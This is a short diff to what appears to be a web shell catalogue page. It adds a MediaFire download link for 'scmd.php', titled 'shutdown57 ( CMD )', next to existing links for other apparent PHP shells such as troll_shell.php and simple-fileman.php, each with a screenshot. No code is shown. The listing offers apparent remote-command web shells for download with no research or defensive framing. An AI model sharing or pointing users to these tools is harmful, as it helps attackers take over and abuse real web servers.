@@ -722,6 +722,9 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 # <a href="https://www.mediafire.com/file/t3erne936hcjbus/simple-fileman.php/file"> simple-fileman</a>
 <img src="https://i.imgur.com/9bWWbD9.jpg" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/f7swkwmrdvllz6b/scmd.php/file">shutdown57 ( CMD )</a>
+<img src="https://i.imgur.com/pmqlRHh.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/viizjs2wqsu880h/troll_shell.php/file">TR0LL1N9</a> 
 <img src="https://imgur.com/kBCu1zl.png" alt="beruangsalju profile">
 
